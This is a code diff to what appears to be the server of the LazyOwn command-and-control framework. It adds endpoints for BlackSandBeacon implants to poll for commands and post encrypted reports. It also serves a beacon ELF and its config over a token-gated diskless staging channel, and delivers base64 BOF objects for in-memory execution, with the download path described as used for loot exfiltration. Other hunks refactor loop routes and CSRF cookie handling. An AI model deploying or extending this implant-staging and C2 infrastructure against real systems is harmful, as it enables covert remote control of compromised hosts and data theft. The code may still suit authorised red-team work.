@@ -146,31 +146,6 @@ from modules.llm_adapter import (
 )
 from modules.llm_orchestrator import complete_with_fallback
 from modules.logging_config import configure as _configure_logging
-from modules.loop_manager import (
-    DEFAULT_ROUNDS,
-    DEFAULT_WORKERS,
-    KIND_AUTO_LOOP,
-    KIND_LAZY_NMAP,
-    MAX_ROUNDS,
-    MAX_TIMEOUT_SECONDS,
-    MAX_WORKERS,
-    LoopManager,
-    LoopNotFoundError,
-    LoopSpec,
-    LoopValidationError,
-)
-from modules.loop_manager import (
-    clamp_float as _loop_clamp_float,
-)
-from modules.loop_manager import (
-    clamp_int as _loop_clamp_int,
-)
-from modules.loop_manager import (
-    sanitize_goal as _loop_sanitize_goal,
-)
-from modules.loop_manager import (
-    validate_target as _loop_validate_target,
-)
 from modules.metrics import REGISTRY
 from modules.security_sanitizers import (
     BindAddressResolver,
@@ -1555,6 +1530,17 @@ def _csrf_enabled() -> bool:
     return bool(getattr(config, "c2_csrf_enabled", True))
 
 
+def _csrf_cookie_secure() -> bool:
+    """Return True when the default C2 listener serves TLS.
+
+    Mirrors the listener bootstrap: the certificate pair in the working
+    directory enables SSL, so CSRF cookies must carry the Secure flag.
+    Per-request HTTPS detection is additionally handled inside
+    register_csrf_flow.
+    """
+    return os.path.isfile("cert.pem") and os.path.isfile("key.pem")
+
+
 def _basic_authenticated() -> bool:
     """Return True when the request carries valid HTTP Basic credentials.
 
@@ -2639,7 +2625,9 @@ if not os.path.exists(SAVE_DIR):
 
 app = Flask(__name__, static_folder="static")
 
-_register_csrf_flow(app, _csrf_policy, _csrf_enabled)
+_register_csrf_flow(app, _csrf_policy, _csrf_enabled, secure_fn=_csrf_cookie_secure)
+app.config["LAZYOWN_CSRF_POLICY"] = _csrf_policy
+app.config["LAZYOWN_CSRF_ENABLED_FN"] = _csrf_enabled
 
 limiter = Limiter(
     app=app,
@@ -4320,6 +4308,269 @@ def receive_result(client_id):
     except Exception:
         logger.exception("Unexpected error in handler")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
+
+
+@app.route("/api/poll/<client_id>", methods=["GET"])
+@limiter.exempt
+def send_command_bsb(client_id):
+    """Serve commands over the fileless BlackSandBeacon default poll URI.
+
+    New BlackSandBeacon builds poll ``<c2.url><c2.uri><client_id>`` with
+    ``c2.uri`` defaulting to ``/api/poll/``, so this alias keeps stock
+    beacon configs checking in against the LazyOwn C2. The client id is
+    registered in the BSB key family before the first command leaves the
+    queue so the HKDF-derived reply is correct from the first poll.
+
+    Args:
+        client_id: Beacon client id from the poll path.
+
+    Returns:
+        The encrypted-command response of :func:`send_command`.
+    """
+    _bsb_beacon_clients.add(str(client_id))
+    return send_command(client_id)
+
+
+@app.route("/api/poll/<client_id>", methods=["POST"])
+@limiter.exempt
+def receive_result_bsb(client_id):
+    """Receive BlackSandBeacon reports posted to the default poll URI.
+
+    Args:
+        client_id: Beacon client id from the poll path.
+
+    Returns:
+        The response of :func:`receive_result` for the posted report.
+    """
+    _bsb_beacon_clients.add(str(client_id))
+    return receive_result(client_id)
+
+
+@app.route("/report/", methods=["POST"])
+@app.route(f"{route_malleable}report/", methods=["POST"])
+@limiter.exempt
+def receive_report_bsb():
+    """Receive BlackSandBeacon reports at the upstream default report URI.
+
+    New BlackSandBeacon beacons POST the ``b64(IV || ciphertext)`` report
+    to ``<c2.url><c2.report_uri>`` (default ``/report/``) with the client
+    id inside the encrypted JSON, so the id is recovered from the payload
+    and the report is re-dispatched through the ``/command/`` handler.
+
+    Returns:
+        The response of :func:`receive_result` for the posted report, or
+        a 400 JSON error when the report fails BSB decryption.
+    """
+    _signature_error = _beacon_signature_guard()
+    if _signature_error is not None:
+        return _signature_error
+    encrypted_data = request.get_data()
+    try:
+        from modules.bsb_compat import decrypt_bsb_report
+
+        data, _bsb_counter, _bsb_ts = decrypt_bsb_report(encrypted_data, _current_aes_key())
+    except Exception as exc:
+        logging.info(f"BSB /report/ decode rejected: {exc}")
+        return jsonify({"status": "error", "message": "Invalid report"}), 400
+    client_id = "".join(c for c in str(data.get("client", "") or "") if c.isalnum() or c in "-_")
+    if not client_id:
+        return jsonify({"status": "error", "message": "Invalid data format"}), 400
+    _bsb_beacon_clients.add(client_id)
+    with app.test_request_context(
+        f"/command/{client_id}",
+        method="POST",
+        data=encrypted_data,
+        headers={"Content-Type": request.headers.get("Content-Type", "application/octet-stream")},
+    ):
+        return receive_result(client_id)
+
+
+def _stage_token() -> str:
+    """Return the live diskless-staging token from payload.json.
+
+    The token is re-read on every request: rotation (``assign stage_token``)
+    can happen out of process while the C2 keeps running.
+
+    Returns:
+        The configured staging token, empty when unset (fail closed).
+    """
+    try:
+        from core.config import load_payload
+
+        return str(load_payload().get("stage_token") or "").strip()
+    except Exception:
+        return str(getattr(config, "stage_token", "") or "").strip()
+
+
+def _stage_token_ok(token: str) -> bool:
+    """Constant-time validate the Bearer staging token; fail closed.
+
+    Args:
+        token: Bearer value presented by the stager.
+
+    Returns:
+        True only when a token is configured and matches.
+    """
+    expected = _stage_token()
+    if not expected or not token:
+        return False
+    return hmac.compare_digest(expected, token)
+
+
+def _staged_beacon_candidates() -> list[str]:
+    """Return the staged beacon ELF paths, newest build first.
+
+    The deploy-staged copy and the addon staging directory can drift when
+    an old session left a stale binary behind; serving order is by mtime
+    so the freshest build always wins.
+
+    Returns:
+        Absolute candidate paths sorted by modification time (newest
+        first).
+    """
+    candidates = [
+        os.path.join(SESSIONS_DIR, "blacksandbeacon"),
+        os.path.join(SESSIONS_DIR, "temp_uploads", "blacksandbeacon"),
+    ]
+    try:
+        candidates.sort(key=lambda p: os.path.getmtime(p) if os.path.isfile(p) else -1.0, reverse=True)
+    except OSError:
+        pass
+    return candidates
+
+
+def _build_stage_config_document() -> bytes:
+    """Build the C2-aligned beacon runtime config for the staging channel.
+
+    Uses the shared delivery contract (``modules.bof_delivery
+    .beacon_runtime_config``) so the staged beacon polls the LazyOwn
+    endpoints with the on-disk master key from the very first run.
+
+    Returns:
+        The config JSON document bytes.
+
+    Raises:
+        Exception: Propagates when the AES key or the payload is missing.
+    """
+    from core.config import load_payload
+
+    data = load_payload()
+    client_id = str(data.get("beacon_client_id", "") or "linux_beacon").strip() or "linux_beacon"
+    from modules.bof_delivery import BofDeliveryConfig, beacon_runtime_config
+
+    document = beacon_runtime_config("blacksandbeacon", client_id, BofDeliveryConfig(), data)
+    return json.dumps(document, indent=2).encode()
+
+
+@app.route("/stage/beacon", methods=["GET"])
+@app.route(f"{route_malleable}stage/beacon", methods=["GET"])
+@limiter.exempt
+def stage_beacon_fileless():
+    """Serve the beacon ELF over the upstream diskless-staging contract.
+
+    Mirrors BlackSandBeacon's ``c2/server.py``: ``GET /stage/beacon`` with
+    ``Authorization: Bearer <stage_token>`` answers
+    ``b64(IV || AES-256-CFB(elf) || HMAC-SHA256 tag)`` under HKDF keys
+    derived from the token, so the upstream stager (``c2/stage_payload.py``)
+    works unchanged against the LazyOwn C2.
+
+    Returns:
+        The encrypted staging blob, or a plain-text rejection.
+    """
+    auth_header = request.headers.get("Authorization", "")
+    token = auth_header[7:].strip() if auth_header.lower().startswith("bearer ") else ""
+    if not _stage_token_ok(token):
+        logging.warning("stage beacon: rejected (bad or missing token)")
+        return "STAGE_FORBIDDEN\r\n", 403
+    for candidate in _staged_beacon_candidates():
+        try:
+            blob = open(candidate, "rb").read()
+        except OSError:
+            continue
+        if blob[:4] != b"\x7fELF":
+            logging.error("stage beacon: %s is not an ELF", candidate)
+            return "STAGE_UNAVAILABLE\r\n", 503
+        logging.info("stage beacon: served (%d bytes from %s)", len(blob), candidate)
+        try:
+            from modules.bsb_compat import encrypt_bsb_stage_blob
+
+            return Response(encrypt_bsb_stage_blob(blob, token), mimetype="text/plain")
+        except Exception as exc:
+            logging.error("stage beacon: encode failed: %s", exc)
+            return "STAGE_UNAVAILABLE\r\n", 503
+    logging.warning("stage beacon: no staged ELF found (run the blacksandbeacon addon or bof_stage)")
+    return "STAGE_UNAVAILABLE\r\n", 503
+
+
+@app.route("/stage/config", methods=["GET"])
+@app.route(f"{route_malleable}stage/config", methods=["GET"])
+@limiter.exempt
+def stage_config_fileless():
+    """Serve the C2-aligned beacon config over the staging contract.
+
+    Same wire format as ``/stage/beacon``; the payload is the runtime
+    config JSON (poll/report URIs, master key, timing) so the fileless
+    beacon agrees with this C2 on first run.
+
+    Returns:
+        The encrypted staging blob, or a plain-text rejection.
+    """
+    auth_header = request.headers.get("Authorization", "")
+    token = auth_header[7:].strip() if auth_header.lower().startswith("bearer ") else ""
+    if not _stage_token_ok(token):
+        logging.warning("stage config: rejected (bad or missing token)")
+        return "STAGE_FORBIDDEN\r\n", 403
+    try:
+        blob = _build_stage_config_document()
+    except Exception as exc:
+        logging.error("stage config: build failed: %s", exc)
+        return "STAGE_UNAVAILABLE\r\n", 503
+    logging.info("stage config: served (%d bytes)", len(blob))
+    try:
+        from modules.bsb_compat import encrypt_bsb_stage_blob
+
+        return Response(encrypt_bsb_stage_blob(blob, token), mimetype="text/plain")
+    except Exception as exc:
+        logging.error("stage config: encode failed: %s", exc)
+        return "STAGE_UNAVAILABLE\r\n", 503
+
+
+@app.route("/bof/<path:name>", methods=["GET"])
+@app.route(f"{route_malleable}bof/<path:name>", methods=["GET"])
+@limiter.exempt
+def serve_bof_object(name):
+    """Serve one compiled BOF object in the upstream wire format.
+
+    The BlackSandBeacon ``bof:<url>`` command downloads ``base64(obj) +
+    CRLF`` (see ``download_bof`` in ``beacon_common.c``), so this route
+    answers the raw base64 of the staged object instead of the AES-wrapped
+    ``/download/`` contract used for loot exfiltration. Lookup is
+    basename-only inside the BOF staging directories.
+
+    Args:
+        name: BOF object filename (``whoami.x64.o``).
+
+    Returns:
+        ``base64(<object>)\\r\\n``, or ``BOF_NOT_FOUND\\r\\n``.
+    """
+    if not name or "\x00" in name:
+        return Response("BOF_NOT_FOUND\r\n", mimetype="text/plain")
+    safe = os.path.basename(str(name))
+    if not safe or safe in (".", ".."):
+        return Response("BOF_NOT_FOUND\r\n", mimetype="text/plain")
+    candidates = [
+        os.path.join(SESSIONS_DIR, "temp_uploads", "bofs", safe),
+        os.path.join(SESSIONS_DIR, "uploads", safe),
+    ]
+    for candidate in candidates:
+        try:
+            blob = open(candidate, "rb").read()
+        except OSError:
+            continue
+        logging.info("bof: serving %s from %s", safe, candidate)
+        return Response(base64.b64encode(blob).decode("ascii") + "\r\n", mimetype="text/plain")
+    logging.info("bof: %s not found in the BOF staging dirs", safe)
+    return Response("BOF_NOT_FOUND\r\n", mimetype="text/plain")
 
 
 @app.route("/issue_command", methods=["POST"])
@@ -7083,124 +7334,6 @@ def api_beacon_results(client_id):
     return jsonify({"client_id": safe_id, "records": records}), 200
 
 
-_loop_manager = LoopManager()
-
-
-def _generic_loop_error():
-    """Return the generic JSON error used for internal loop failures.
-
-    Returns:
-        Tuple of (payload, status) hiding internal details from clients.
-    """
-    return jsonify({"error": "loop request failed"}), 500
-
-
-@app.route("/api/loops", methods=["POST"])
-@requires_auth
-@csrf_protect
-@limiter.limit("10 per minute")
-def api_loops_start():
-    """Start one autonomous loop subprocess from the dashboard.
-
-    The request body must be a JSON object with a ``kind`` of either
-    ``auto_loop`` or ``lazynmap``, a valid IP ``target`` and, for
-    ``auto_loop``, optional ``goal``/``rounds``/``workers``/``timeout``
-    knobs. Every field is validated by :mod:`modules.loop_manager`
-    before a subprocess is spawned; failures answer with a generic
-    error that never leaks internals.
-    """
-    try:
-        data = request.get_json(silent=True)
-        if not isinstance(data, dict):
-            return jsonify({"error": "Invalid request body"}), 400
-        kind = data.get("kind")
-        if kind not in (KIND_AUTO_LOOP, KIND_LAZY_NMAP):
-            return jsonify({"error": "kind must be auto_loop or lazynmap"}), 400
-        try:
-            spec = LoopSpec(
-                kind=str(kind),
-                target=_loop_validate_target(data.get("target")),
-                goal=_loop_sanitize_goal(data.get("goal")) if kind == KIND_AUTO_LOOP else "",
-                rounds=_loop_clamp_int(
-                    data.get("rounds", DEFAULT_ROUNDS), "rounds", DEFAULT_ROUNDS, 1, MAX_ROUNDS
-                ),
-                workers=_loop_clamp_int(
-                    data.get("workers", DEFAULT_WORKERS), "workers", DEFAULT_WORKERS, 1, MAX_WORKERS
-                ),
-                timeout=_loop_clamp_float(
-                    data.get("timeout", 0), "timeout", 0.0, 0.0, MAX_TIMEOUT_SECONDS
-                ),
-            )
-            operator = str(getattr(current_user, "username", "") or "")
-            record = _loop_manager.start(spec, operator=operator)
-        except LoopValidationError as err:
-            detail = str(err)
-            return jsonify({"error": detail, "field": err.field}), 400
-        except OSError:
-            logger.exception("loop spawn failed")
-            return _generic_loop_error()
-        return jsonify(record), 201
-    except Exception:
-        logger.exception("api_loops_start failed")
-        return _generic_loop_error()
-
-
-@app.route("/api/loops", methods=["GET"])
-@requires_auth
-@limiter.limit("120 per minute")
-def api_loops_list():
-    """List every autonomous loop with refreshed live status."""
-    try:
-        return jsonify({"loops": _loop_manager.list_loops()}), 200
-    except Exception:
-        logger.exception("api_loops_list failed")
-        return _generic_loop_error()
-
-
-@app.route("/api/loops/<loop_id>/log", methods=["GET"])
-@requires_auth
-@limiter.limit("300 per minute")
-def api_loop_log(loop_id):
-    """Return one chunk of a loop's output log.
-
-    Args:
-        loop_id: Hex loop identifier from the URL.
-    """
-    try:
-        offset = request.args.get("offset", 0)
-        return jsonify(_loop_manager.read_log(loop_id, offset)), 200
-    except LoopNotFoundError:
-        return jsonify({"error": "loop not found"}), 404
-    except LoopValidationError as err:
-        detail = str(err)
-        return jsonify({"error": detail}), 400
-    except Exception:
-        logger.exception("api_loop_log failed")
-        return _generic_loop_error()
-
-
-@app.route("/api/loops/<loop_id>/stop", methods=["POST"])
-@requires_auth
-@csrf_protect
-@limiter.limit("30 per minute")
-def api_loop_stop(loop_id):
-    """Stop one running loop by terminating its process group.
-
-    Args:
-        loop_id: Hex loop identifier from the URL.
-    """
-    try:
-        return jsonify(_loop_manager.stop(loop_id)), 200
-    except LoopNotFoundError:
-        return jsonify({"error": "loop not found"}), 404
-    except LoopValidationError as err:
-        detail = str(err)
-        return jsonify({"error": detail}), 409
-    except Exception:
-        logger.exception("api_loop_stop failed")
-        return _generic_loop_error()
-
-
 def _render_enhanced_report():
     try:
         from modules.report_templates import ReportGenerator
@@ -7330,7 +7463,8 @@ def _render_legacy_report():
     tasks = load_tasks()
     cves = load_cves()
     try:
-        loops_summary = _loop_manager.summary()
+        from modules.loop_manager import default_manager as _loop_default_manager
+        loops_summary = _loop_default_manager().summary()
     except Exception:
         if config.enable_c2_debug:
             logger.info("loop summary unavailable")
@@ -9000,7 +9134,18 @@ def api_listeners_delete(listener_id):
 
 
 try:
-    from lazyc2.blueprints import addons_bp, api_bp, auth_bp, beacon_bp, init_beacon_bp, operations_bp, redirect_bp
+    from lazyc2.blueprints import (
+        addons_bp,
+        api_bp,
+        auth_bp,
+        beacon_bp,
+        gym_bp,
+        init_beacon_bp,
+        init_loops_bp,
+        loops_bp,
+        operations_bp,
+        redirect_bp,
+    )
 
     init_beacon_bp(
         commands=commands,
@@ -9013,6 +9158,13 @@ try:
         sessions_dir=SESSIONS_DIR,
         route_malleable=route_malleable,
     )
+
+    def _loops_guard(view, needs_csrf: bool):
+        if needs_csrf:
+            return requires_auth(csrf_protect(view))
+        return requires_auth(view)
+
+    init_loops_bp(limiter, guard=_loops_guard)
     app.register_blueprint(operations_bp)
     app.register_blueprint(auth_bp)
 
@@ -9020,6 +9172,8 @@ try:
     app.register_blueprint(redirect_bp)
     app.register_blueprint(api_bp)
     app.register_blueprint(addons_bp)
+    app.register_blueprint(gym_bp)
+    app.register_blueprint(loops_bp)
 except Exception as _obp_err:
     print(f"[c2] Blueprint not loaded: {_obp_err}")
 
